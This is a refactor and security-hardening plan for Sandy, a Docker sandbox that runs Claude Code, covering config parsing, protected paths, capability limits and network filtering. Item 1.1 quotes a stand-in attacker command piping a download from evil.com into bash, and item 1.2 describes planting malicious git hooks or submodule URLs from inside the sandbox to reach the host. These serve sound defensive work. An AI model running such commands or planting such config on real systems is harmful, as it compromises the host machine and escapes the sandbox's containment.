# Sandy Refactor Plan

*Generated 2026-03-21 by three parallel analysis agents + synthesis.*
*Updated 2026-03-20: Added `/sandbox` competitive context and elevated domain filtering priority.*
*Prior audit: `analysis/00-04`. This plan covers NEW findings not addressed in the prior audit.*

> **Key strategic context:** Claude Code's built-in `/sandbox` command (October 2025, powered by srt) now provides baseline sandboxing with domain-based network filtering out of the box. Sandy's network isolation (iptables IP-range blocking) is currently *weaker* than the built-in option for preventing data exfiltration. Domain filtering is now the most urgent feature gap — see `analysis/04-replacement-evaluation.md` §0 for full analysis.

---

## 1. Critical Fixes

Things that are broken, will break soon, or represent unmitigated security risks.

### 1.1 `.sandy/config` sourced as raw bash on the HOST from untrusted workspaces
- **Agent:** 3 (Hardening) — S1
- **Lines:** 569-571
- **Issue:** `.sandy/config` is `source`'d as arbitrary bash **on the host** before the container is created. A malicious repo could include `.sandy/config` containing `curl evil.com/payload | bash`. The SANDY_HOME metacharacter validation (line 23) does not protect against this — the entire config file is executed as host code.
- **Fix:** Replace `source` with a safe key-value parser that only sets known, validated variables:
  ```bash
  while IFS='=' read -r key value; do
      case "$key" in
          SANDY_SSH|SANDY_MODEL|SANDY_SKIP_PERMISSIONS|SANDY_ALLOW_NO_ISOLATION|SANDY_CPUS|SANDY_MEM|ANTHROPIC_API_KEY|CLAUDE_CODE_MAX_OUTPUT_TOKENS)
              # Strip leading/trailing whitespace and quotes
              value="${value#\"}" ; value="${value%\"}"
              value="${value#\'}" ; value="${value%\'}"
              export "$key=$value" ;;
      esac
  done < <(grep -E '^[A-Z_]+=.+' "$WORK_DIR/.sandy/config" 2>/dev/null)
  ```
- **Effort:** 30 min. **Priority:** P0 — host code execution from workspace files.

### 1.2 Missing protected paths vs. Anthropic's sandbox-runtime
- **Agent:** 3 (Hardening) — S5
- **Lines:** 1022-1027
- **Issue:** Sandy protects `.git/hooks` but NOT `.git/config`, `.gitconfig`, `.gitmodules`, `.ripgreprc`, or `.mcp.json`. Claude could write a malicious `core.hooksPath` or `core.fsmonitor` directive to `.git/config`, achieving code execution on the host when the user later runs git commands outside the sandbox. `.gitmodules` could redirect submodule URLs to attacker-controlled repos.
- **Fix:** Add to the protected files list:
  ```bash
  # Protected files (line 1022)
  for _pf in .bashrc .bash_profile .zshrc .zprofile .profile .gitconfig .ripgreprc .mcp.json; do
  # Protected dirs (line 1025) — no change, but add .git/config as a file:
  # And add .git/config to the protected files:
  [ -e "$WORK_DIR/.git/config" ] && RUN_FLAGS+=(-v "$WORK_DIR/.git/config:$SANDY_WORKSPACE/.git/config:ro")
  [ -e "$WORK_DIR/.gitmodules" ] && RUN_FLAGS+=(-v "$WORK_DIR/.gitmodules:$SANDY_WORKSPACE/.gitmodules:ro")
  ```
  Note: `.git/config` being read-only will prevent `git config` writes inside the container. Sandy already sets git identity via env vars (lines 332-337), but some workflows (LFS filters, etc.) may need git config writes. Consider whether `.git/config` should be protected or if this is too disruptive. At minimum, `.gitmodules` and workspace-level `.gitconfig` should be protected.
- **Effort:** 15 min. **Priority:** P0 — host code execution via git config.

### 1.3 Version mismatch: SANDY_VERSION says 0.5.0, release notes say 0.6.0
- **Agent:** 2 (Cleanup) — 1.1
- **Lines:** 19
- **Issue:** `SANDY_VERSION="0.5.0"` but `RELEASE_NOTES.md` describes v0.6.0. The `--version` flag and help banner report the wrong version.
- **Fix:** `SANDY_VERSION="0.6.0"` (one-line change).
- **Effort:** 1 min. **Priority:** P0 — user-facing version is wrong.

### 1.4 Auto-resume broken for git submodule workspaces
- **Agent:** 2 (Cleanup) — 1.3
- **Lines:** 422, 965, 980
- **Issue:** Auto-resume checks `$HOME/.claude/projects/-workspace/*.jsonl` which corresponds to `/workspace`. But for submodule workspaces, `SANDY_WORKSPACE` is set to something like `/repo/submod`, which encodes to a different projects path (e.g., `-repo-submod`). Auto-resume will never find sessions for submodule workspaces.
- **Fix:** Use `SANDY_WORKSPACE` to compute the session path:
  ```bash
  SESSION_DIR="$HOME/.claude/projects/$(echo "$WORKSPACE" | tr '/' '-')/"
  if ls "$SESSION_DIR"*.jsonl &>/dev/null; then
  ```
- **Effort:** 15 min. **Priority:** P1 — functional bug for submodule users.

---

## 2. Quick Wins

Low-effort, high-value cleanups. Each is < 15 minutes.

### 2.1 Remove dead python3 SSH relay fallback
- **Agent:** 2 (Cleanup) — 2.3
- **Lines:** 1108-1136
- **Issue:** The macOS preflight (line 576) hard-requires socat and exits if missing. The python3 fallback relay and the final `else` error branch are unreachable. On Linux, SSH agent is mounted directly (line 1096), so the entire macOS relay section is never entered.
- **Fix:** Delete lines 1108-1136 (the `elif command -v python3` branch and the `else` error). Saves ~30 lines.
- **Effort:** 5 min.

### 2.2 Factor `shasum || sha256sum` into a helper
- **Agent:** 2 (Cleanup) — 2.1
- **Lines:** 506, 519, 583, 746
- **Issue:** `{ shasum -a 256 2>/dev/null || sha256sum; }` appears 4 times.
- **Fix:** Add helper near the top of the script:
  ```bash
  sha256() { shasum -a 256 2>/dev/null || sha256sum; }
  ```
  Replace 4 call sites with `... | sha256 | cut -d' ' -f1`.
- **Effort:** 5 min.

### 2.3 Remove stale `NODE_OPTIONS` from Dockerfile
- **Agent:** 1 (Compat) — #1
- **Lines:** 196
- **Issue:** `NODE_OPTIONS="--max-old-space-size=2048"` was relevant when Claude Code was a Node.js app. The native installer now produces a statically compiled binary. The env var is silently ignored but signals stale understanding.
- **Fix:** Remove `NODE_OPTIONS="--max-old-space-size=2048"` from the `RUN` line.
- **Effort:** 1 min.

### 2.4 Add `--pids-limit` to prevent fork bombs
- **Agent:** 3 (Hardening) — S3
- **Lines:** 935-944
- **Issue:** No process limit. A fork bomb exhausts host PID space.
- **Fix:** Add `RUN_FLAGS+=(--pids-limit 512)` after line 941.
- **Effort:** 1 min.

### 2.5 Fix socat branch's implicit python3 dependency for port allocation
- **Agent:** 2 (Cleanup) — 1.2
- **Lines:** 1103
- **Issue:** The socat branch (macOS SSH relay) uses `python3 -c "import socket; ..."` to allocate an ephemeral port, but the macOS preflight only checks for socat, not python3. If socat is installed but python3 is not, the script crashes under `set -euo pipefail`.
- **Fix:** Use socat's own port 0 binding, or add python3 to the preflight check, or use a bash alternative:
  ```bash
  # Replace the python3 port allocation with:
  SSH_RELAY_PORT=$(socat -d TCP-LISTEN:0,bind=127.0.0.1,fork,reuseaddr UNIX-CONNECT:"$SSH_AUTH_SOCK" 2>&1 &
  # Or simpler: let the OS pick via port 0
  ```
  Alternative: just add `python3` to the preflight check at line 576.
- **Effort:** 10 min.

### 2.6 Fix asymmetric cleanup warning on normal exit
- **Agent:** 3 (Hardening) — U5
- **Lines:** 804
- **Issue:** ACCEPT rule cleanup warns on failure, but DROP rule cleanup uses `|| true`. Normal exits show a spurious warning.
- **Fix:** Change `|| warn "Note: could not remove..."` to `|| true` on line 804.
- **Effort:** 1 min.

### 2.7 Remove or document `DISABLE_SPINNER_TIPS=1`
- **Agent:** 1 (Compat) — #2
- **Lines:** 293
- **Issue:** This env var may be ignored by current Claude Code. The correct mechanism (`spinnerTipsEnabled: false` in settings.json) is already applied at line 646, and `tipsDisabled: true` is set in `.claude.json` at line 841. Three redundant tip-disabling mechanisms.
- **Fix:** Remove line 293. The settings.json approach is authoritative.
- **Effort:** 1 min.

### 2.8 Set `ENABLE_CLAUDEAI_MCP_SERVERS=false` in entrypoint
- **Agent:** 1 (Compat) — #9
- **Lines:** 290-293 (add after)
- **Issue:** Cloud MCP connectors cannot work in sandy's network-isolated environment. They will fail with unhelpful errors. Disabling them proactively prevents confusion.
- **Fix:** Add `export ENABLE_CLAUDEAI_MCP_SERVERS=false` to the entrypoint user-phase.
- **Effort:** 1 min.

### 2.9 Fix config sourcing order so SANDY_CPUS/SANDY_MEM are overridable
- **Agent:** 3 (Hardening) — U1, U4
- **Lines:** 500-501 vs. 569
- **Issue:** `SANDY_CPUS` and `SANDY_MEM` are computed unconditionally at lines 500-501, *before* `.sandy/config` is sourced at line 569. Even if a user sets `SANDY_CPUS=4` in config, it has no effect. The docs imply these are configurable.
- **Fix:** Use the `${VAR:-default}` pattern:
  ```bash
  SANDY_CPUS="${SANDY_CPUS:-$AVAILABLE_CPUS}"
  SANDY_MEM="${SANDY_MEM:-$(( AVAILABLE_MEM_GB > 2 ? AVAILABLE_MEM_GB - 1 : 2 ))g}"
  ```
  AND move these lines to after the config sourcing at line 569. Or, move config sourcing earlier (before resource computation).
- **Effort:** 10 min.

---

## 3. Refactors

Larger structural changes with effort estimates and tradeoffs.

### 3.1 Extract gosu block into separate `user-setup.sh` script
- **Agent:** 2 (Cleanup) — 2.6
- **Lines:** 287-434 (149 lines inside `bash -c '...'`)
- **Issue:** 149 lines of bash embedded inside a single-quoted string passed to `exec gosu ... bash -c`. No single quotes allowed anywhere. ShellCheck cannot analyze it. Error line numbers are useless for debugging.
- **Approach:** Generate a separate `user-setup.sh` in `ensure_build_files()`. The root-phase entrypoint does its work then `exec gosu "$RUN_UID:$RUN_GID" /usr/local/bin/user-setup.sh "$@"`. Both scripts are still generated inline (preserving single-file distribution). The Dockerfile gets one more `COPY user-setup.sh /usr/local/bin/user-setup.sh`.
- **Tradeoff:** Adds one more file to the build context but eliminates the most dangerous quoting hazard in the codebase. ShellCheck can now analyze the user-phase code.
- **Effort:** 1 hr.

### 3.2 Consolidate node -e JSON manipulation into a helper function
- **Agent:** 2 (Cleanup) — 2.2
- **Lines:** 637, 666, 717, 836, 852 (8 total node -e invocations, 3 near-duplicate patterns)
- **Issue:** Repeated boilerplate: read file, try-parse, merge keys, write file. ~50 lines of duplication. Silent data loss on parse failure (falls back to empty `{}`).
- **Approach:** Create a `json_merge` helper:
  ```bash
  json_merge() {  # usage: json_merge <file> '{"key":"value",...}'
      node -e '
          const fs=require("fs"), f=process.argv[1], m=JSON.parse(process.argv[2]);
          let s; try{s=JSON.parse(fs.readFileSync(f,"utf8"))}catch(e){console.error("[sandy] WARN: could not parse "+f+", starting fresh");s={};}
          Object.assign(s,m);
          fs.writeFileSync(f,JSON.stringify(s,null,2)+"\n");
      ' "$1" "$2"
  }
  ```
  Replaces 5 of the 8 node blocks. The marketplace and cmux blocks have more complex logic but could use a shared reader/writer wrapper.
- **Tradeoff:** Adds a helper function but removes ~40-50 lines of duplicated boilerplate. Also adds a warning on parse failure instead of silent data loss.
- **Effort:** 1 hr.

### 3.3 Add `--cap-drop ALL --cap-add` minimal capabilities
- **Agent:** 3 (Hardening) — S2
- **Lines:** 935-944
- **Issue:** Docker's default capability set includes CAP_NET_RAW, CAP_MKNOD, CAP_AUDIT_WRITE, etc. The entrypoint needs SETUID/SETGID (for gosu), CHOWN, DAC_OVERRIDE, FOWNER (for chown operations).
- **Approach:** Add to RUN_FLAGS:
  ```bash
  RUN_FLAGS+=(--cap-drop ALL)
  RUN_FLAGS+=(--cap-add SETUID --cap-add SETGID)
  RUN_FLAGS+=(--cap-add CHOWN --cap-add DAC_OVERRIDE --cap-add FOWNER)
  ```
- **Tradeoff:** May break edge cases where Claude installs packages that need other capabilities. Test thoroughly.
- **Effort:** 30 min (implementation) + 1 hr (testing).

### 3.4 Handle `CLAUDE_CODE_OAUTH_TOKEN` env var
- **Agent:** 1 (Compat) — #8
- **Lines:** 1072-1074
- **Issue:** If the host has `CLAUDE_CODE_OAUTH_TOKEN` set, it could leak into the container and override sandy's credential management. Sandy should either explicitly pass it (if the user wants it) or explicitly block it.
- **Approach:** Add `-e CLAUDE_CODE_OAUTH_TOKEN=` (empty) to RUN_FLAGS to prevent leakage. Or, if the user explicitly sets it in `.sandy/config`, pass it through.
- **Effort:** 10 min.

### 3.5 Make `CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS` opt-in
- **Agent:** 1 (Compat) — #4 / Agent 2 (Cleanup) — 3.1 / Agent 3 (Hardening) — C1
- **Lines:** 290
- **Issue:** Unconditionally enabled, undocumented, potentially token-intensive experimental feature.
- **Approach:** Make it configurable via `.sandy/config` and document it:
  ```bash
  export CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS="${CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS:-0}"
  ```
  Default to off. Users who want it set `CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS=1` in their `.sandy/config`.
- **Effort:** 5 min.

### 3.6 Split `ensure_build_files()` into sub-functions
- **Agent:** 2 (Cleanup) — 2.5
- **Lines:** 120-482 (363 lines, 5+ heredocs)
- **Issue:** Single function with 5 heredocs spanning 363 lines. Hard to navigate.
- **Approach:** Split into `generate_dockerfile_base()`, `generate_dockerfile()`, `generate_entrypoint()`, `generate_tmux_conf()`. Each writes its heredoc to `$SANDY_HOME/<file>.new`. The parent function calls them and handles the diff/update logic.
- **Tradeoff:** More functions but each is self-contained and navigable. Does NOT change the distribution model (still a single file).
- **Effort:** 30 min.

### 3.7 Evaluate Claude Code's built-in sandbox vs. sandy's Docker sandbox
- **Agent:** 1 (Compat) — #12
- **Lines:** N/A (settings.json)
- **Issue:** Claude Code v2.1.38+ has its own sandbox system. Running inside sandy creates a double-sandbox scenario. It's unclear whether the inner sandbox causes issues (e.g., trying to use bubblewrap inside a container, seccomp conflicts).
- **Approach:** Research whether `sandbox.enabled: false` or `enableWeakerNestedSandbox: true` should be set in settings.json. Test with both configurations.
- **Effort:** 2 hr (research + testing).

### 3.8 Protect `.claude/plugins/` directory
- **Agent:** 3 (Hardening) — S6
- **Lines:** 1025-1027
- **Issue:** `.claude/plugins/` in the workspace is not write-protected. Plugins could be a code execution vector.
- **Fix:** Add `.claude/plugins` to the protected directories list on line 1025.
- **Effort:** 5 min.

### 3.9 Address permission bypass dual-path conflict
- **Agent:** 3 (Hardening) — S7
- **Lines:** 405-406, 646
- **Issue:** `skipDangerousModePermissionPrompt: true` is hardcoded in settings.json (line 646) regardless of `SANDY_SKIP_PERMISSIONS`. If a user sets `SANDY_SKIP_PERMISSIONS=false`, the CLI flag is omitted but the settings.json value may still suppress the prompt.
- **Fix:** Make the settings.json value conditional on `SANDY_SKIP_PERMISSIONS`:
  ```bash
  const skip = process.env.SANDY_SKIP_PERMISSIONS !== 'false';
  const defaults = {teammateMode:'tmux', spinnerTipsEnabled:false, skipDangerousModePermissionPrompt:skip};
  ```
- **Effort:** 15 min.

---

## 4. Deferred

Noted but not worth doing now, with rationale.

### 4.1 python3 fallback in `token_needs_refresh()` (lines 889-901)
- **Agent:** 2 (Cleanup) — 2.4
- **Rationale:** Near-dead code (node is implicitly required elsewhere, e.g., line 970). However, removing it could break the rare case where a user has python3 but not node on the host. Low priority since the function gracefully falls back to "don't refresh." Keep for now, revisit if node becomes an explicit host prerequisite.

### 4.2 Custom seccomp profile
- **Agent:** 3 (Hardening) — S4
- **Rationale:** Docker's default seccomp profile blocks ~44 dangerous syscalls. A custom profile would add marginal security. The effort to create, test, and maintain a custom profile is high relative to the benefit, especially since sandy already uses `--read-only`, `no-new-privileges`, and (after 3.3) `--cap-drop ALL`.

### 4.3 Credentials via env vars visible in `/proc`
- **Agent:** 3 (Hardening) — S8 (also prior audit finding #2, #5)
- **Rationale:** `ANTHROPIC_API_KEY` and `GIT_TOKEN` are passed via `-e` flags. The proper fix is Docker secrets or file-based injection. However, the container is single-tenant, non-root processes cannot read other processes' `/proc/*/environ`, and `no-new-privileges` prevents escalation. The risk is primarily from `docker inspect` on the host, which requires Docker group access (already a root-equivalent). Defer until Docker secrets support is added.

### 4.4 CRED_TMPDIR leaked on SIGKILL
- **Agent:** 3 (Hardening) — U6
- **Rationale:** SIGKILL cannot be trapped. The tmpdir has mode 600 and is in `/tmp` (usually cleaned on reboot). A systemd tmpfiles rule or cron job could clean stale `tmp.*` dirs, but this is outside sandy's scope. The per-instance iptables rules also leak on SIGKILL but reference a dead bridge name and have no effect. Accept as a known limitation.

### 4.5 `--internal` network as iptables replacement
- **Agent:** 2 (Cleanup) — 2.7
- **Rationale:** `docker network create --internal` blocks ALL outbound traffic including internet. Sandy needs internet access for git, npm, pip, etc. The iptables approach (block LAN, allow internet) is correct. No change needed unless a proxy layer is added.
- **UPDATE (2026-03-20):** Domain-based proxy filtering is now **elevated to Phase 5** (see below). Once a proxy layer is added, `--internal` + proxy becomes the likely architecture, replacing iptables entirely. This deferred item will be revisited at that point.

### 4.6 `installMethod` migration code (lines 850-862)
- **Agent:** 3 (Hardening) — C3
- **Rationale:** Runs every launch but is fast and idempotent. After 2-3 more releases, all sandboxes will have been migrated. Add a TODO comment with a removal date (e.g., "Remove after v0.8.0") rather than removing now.

### 4.7 New `~/.claude/` subdirectories growing disk usage
- **Agent:** 1 (Compat) — #3
- **Rationale:** `file-history/`, `todos/`, `backups/`, etc. are persisted in the sandbox directory via the bind mount. This is correct behavior. The disk growth concern is real for long-lived sandboxes but is a documentation/monitoring issue, not a code change. Consider adding a `sandy --cleanup` command in a future release to prune old file-history entries.

### 4.8 Extract symlink scanning and submodule detection into functions
- **Agent:** 2 (Cleanup) — 3.4, 3.5
- **Rationale:** Pure readability improvement. The inline code works correctly. Do this as part of a larger readability pass, not as a standalone change.

---

## Execution Order

For maximum safety and minimum risk, execute in this order:

| Phase | Items | Estimated Effort |
|-------|-------|-----------------|
| **Phase 1: Safety** | 1.1 (config injection), 1.2 (protected paths), 1.3 (version bump) | 45 min |
| **Phase 2: Quick wins** | 2.1-2.9 (dead code, helpers, env vars, config order) | 45 min |
| **Phase 3: Structural** | 3.1 (user-setup.sh), 3.2 (json helper), 3.3 (cap-drop), 3.5 (agent teams opt-in), 3.6 (split ensure_build_files) | 3 hr |
| **Phase 4: Polish** | 3.4 (OAuth token), 3.7 (sandbox eval), 3.8 (plugins protection), 3.9 (permission dual-path) | 2.5 hr |
| **Phase 5: Domain filtering** | Adopt proxy-based domain filtering from srt (see below) | 2-3 days |

Total estimated effort: ~7 hours (Phases 1-4) + 2-3 days (Phase 5).

### Phase 5: Domain-Based Network Filtering (Post-Refactor)

**Context:** Claude Code's built-in `/sandbox` already provides domain-based network filtering via srt. Sandy's iptables IP-range blocking is the only isolation dimension where `/sandbox` is stronger than sandy. This is a competitive positioning problem: sandy claims to be the more secure option, but its network filtering is coarser.

**Scope:** Add HTTP/SOCKS5 proxy inside the container, enforce domain allowlists, log violations. This is detailed in `research/FEATURE-ADOPTION-ANALYSIS.md` §Phase 2-3 and `research/IMPLEMENTATION-SKETCHES.md`.

**Why after the refactor:** The structural cleanup (Phase 3: user-setup.sh extraction, json helper, split ensure_build_files) makes the codebase more maintainable and gives a cleaner foundation for adding the proxy layer. Do the refactor first, then add the feature.

**Architecture direction:** Once a proxy layer exists, the iptables approach can potentially be replaced with `docker network create --internal` + proxy allowlist, which would be simpler, work identically on Linux and macOS, and eliminate the iptables complexity entirely.
